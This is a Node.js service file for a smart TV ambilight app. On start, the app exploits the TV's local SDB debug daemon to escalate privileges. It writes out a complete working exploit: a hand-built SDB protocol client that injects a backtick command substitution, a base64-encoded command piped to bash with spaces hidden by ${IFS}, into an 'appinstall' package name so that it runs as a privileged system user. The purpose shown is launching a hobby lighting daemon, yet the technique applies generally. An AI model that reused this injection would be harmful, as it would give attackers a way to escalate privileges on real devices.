// WLED Ambilight — SVE-2025-50109 loopback self-launch.
// Talks SDB wire protocol to 127.0.0.1:26101 (sdbd); devIP=127.0.0.1 makes the
// TV its own authorized host. Injects `0 appinstall tpk <pkg>` with a backtick
// command-substitution payload -> runs as uid=901(sdk), SMACK label "System".
const net = require('net');
const { spawn } = require('child_process');

const SDB_PORT = 26101;
const WLED_IP = '192.168.3.176';
const LAUNCH_CMD = 'env HOME=/tmp /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe '
  + WLED_IP + ' 4048 -1 > /tmp/wledambi.log 2>&1 &';

function u32(v) { const b = Buffer.alloc(4); b.writeUInt32LE(v >>> 0); return b; }
function packet(cmd, arg0, arg1, data) {
  data = data || Buffer.alloc(0);
  const c = Buffer.from(cmd, 'ascii').readUInt32LE(0);
  let sum = 0; for (let i = 0; i < data.length; i++) sum = (sum + data[i]) >>> 0;
  return Buffer.concat([u32(c), u32(arg0), u32(arg1), u32(data.length), u32(sum), u32(c ^ 0xFFFFFFFF), data]);
}

function sdbInject(command, cb) {
  const b64 = Buffer.from(command, 'utf8').toString('base64');
  // new2.tpk`printf%s${IFS}<b64>|base64${IFS}-d|bash`.tpk  (IFS avoids literal spaces)
  const inj = 'new2.tpk`printf${IFS}%s${IFS}' + b64 + '|base64${IFS}-d|bash`.tpk';
  const service = 'shell:0 appinstall tpk ' + inj + '\0';
  const sock = net.createConnection(SDB_PORT, '127.0.0.1');
  let buf = Buffer.alloc(0), opened = false, local = 1, remote = 0, done = false;
  const finish = (e) => { if (!done) { done = true; try { sock.destroy(); } catch (_) {} cb && cb(e); } };
  sock.setTimeout(15000, () => finish(new Error('timeout')));
  sock.on('error', finish);
  sock.on('connect', () => sock.write(packet('CNXN', 0x01000000, 4096, Buffer.from('host::\0'))));
  sock.on('data', (d) => {
    buf = Buffer.concat([buf, d]);
    while (buf.length >= 24) {
      const cmd = buf.toString('ascii', 0, 4);
      const arg0 = buf.readUInt32LE(4), arg1 = buf.readUInt32LE(8);
      const len = buf.readUInt32LE(12);
      if (buf.length < 24 + len) break;
      const payload = buf.slice(24, 24 + len);
      buf = buf.slice(24 + len);
      if (cmd === 'CNXN') {
        console.log('[wled-ambi] CNXN ok');
        sock.write(packet('OPEN', local, 0, Buffer.from(service)));
      } else if (cmd === 'OKAY') {
        if (!opened) { opened = true; remote = arg0; console.log('[wled-ambi] OPEN ok'); }
        else { }
      } else if (cmd === 'WRTE') {
        sock.write(packet('OKAY', arg1, arg0));
        const txt = payload.toString('utf8');
        if (txt.trim()) console.log('[wled-ambi] out: ' + txt.trim().slice(0, 200));
      } else if (cmd === 'CLSE') {
        finish(null);
      }
    }
  });
  sock.on('close', () => finish(null));
}

module.exports.onStart = function () {
  console.log('[wled-ambi] service start');
  // 1) sdbd loopback injection -> sdk/System context spawns the ambilight daemon
  sdbInject(LAUNCH_CMD, (e) => {
    if (e) console.log('[wled-ambi] sdb inject failed: ' + e.message);
    else console.log('[wled-ambi] injected, ambilight launched as sdk/System');
  });
  // 2) fallback: direct spawn (app label — capture may return black, kept for diagnosis)
};
module.exports.onRequest = function () {};
module.exports.onExit = function () {};
